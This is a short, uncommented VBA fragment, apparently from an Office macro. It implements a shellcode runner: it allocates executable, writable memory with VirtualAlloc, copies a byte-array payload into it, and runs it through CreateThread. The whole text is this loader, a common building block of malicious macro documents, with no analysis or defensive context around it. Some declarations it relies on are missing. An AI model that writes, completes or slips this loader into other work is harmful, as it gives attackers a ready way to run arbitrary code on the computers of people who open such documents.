Private Declare Function CreateThread Lib "kernel32" (ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadId As Long) As Long
Private Declare Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long

Private Sub Run(ByRef bPayloadArr() As Byte)
    Dim lPayloadAddr As Long, lPayloadSize As Long
    lPayloadAddr = VarPtr(bPayloadArr(0))
    lPayloadSize = UBound(bPayloadArr) - LBound(bPayloadArr) + 1

    Dim lpMemPtr As Long, lResult As Long
    lpMemPtr = VirtualAlloc(0&, lPayloadSize, MEM_RESERVE Or MEM_COMMIT, PAGE_EXECUTE_READWRITE)
    
    RtlMoveMemory lpMemPtr, lPayloadAddr, lPayloadSize
    lResult = CreateThread(0&, 0&, lpMemPtr, 0&, 0&, 0&)
End Sub